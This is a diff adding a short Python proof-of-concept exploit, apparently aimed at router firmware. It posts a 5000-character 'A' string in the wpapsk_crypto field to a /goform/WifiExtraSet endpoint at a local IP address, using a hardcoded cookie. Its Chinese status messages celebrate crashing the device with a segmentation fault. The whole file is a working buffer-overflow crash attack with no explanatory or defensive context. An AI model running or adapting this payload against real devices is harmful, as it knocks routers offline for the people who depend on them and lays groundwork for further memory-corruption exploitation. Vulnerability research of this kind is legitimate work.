@@ -1,0 +1,27 @@
+import requests
+from pwn import *
+
+ip = '192.168.252.136'
+url = f'http://{ip}/goform/WifiExtraSet'
+
+cookies = {"password": "recmji"}
+
+payload = {
+    "mac": "00:11:22:33:44:55",
+    "wifi_chkHz": "0",          
+    "wl_mode": "wisp",          
+    "security": "wpapsk",       
+    "wpapsk_key": "12345678",   
+    "wpapsk_crypto": "A" * 5000  
+}
+
+pause()
+
+try:
+    print(f"[*] 发送致命 Payload 到 {url}...")
+    res = requests.post(url=url, cookies=cookies, data=payload, timeout=3)
+    print("[-] 竟然没崩？响应:", res.text)
+except requests.exceptions.ConnectionError:
+    print("[+] 连接被强行切断！完美触发崩溃 (SIGSEGV)！")
+except requests.exceptions.ReadTimeout:
+    print("[+] 请求超时！进程挂起。")
